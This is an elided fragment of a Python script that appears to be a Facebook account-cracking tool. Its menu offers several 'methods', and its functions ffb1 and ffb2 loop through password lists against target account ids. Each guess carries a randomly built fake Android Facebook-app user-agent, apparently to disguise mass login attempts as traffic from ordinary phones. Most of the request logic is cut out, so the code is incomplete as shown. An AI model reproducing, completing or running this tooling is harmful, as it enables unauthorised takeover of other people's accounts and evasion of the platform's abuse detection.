...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' [1] Method 1 \033[1;31m[OLD]')
                                print(' [2] Method 2 \033[1;91m[MAINTENANCE]')
                                print(' [3] Method 3 \033[1;31m[NEW]')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
...
def ffb2(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.5,width=1080,height=1497};FBLC/en_US;FBRV/'+fbrv+';FBCR/Digicel Haiti;FBMF/lenovo;FBBD/lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Vibe Z;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'               
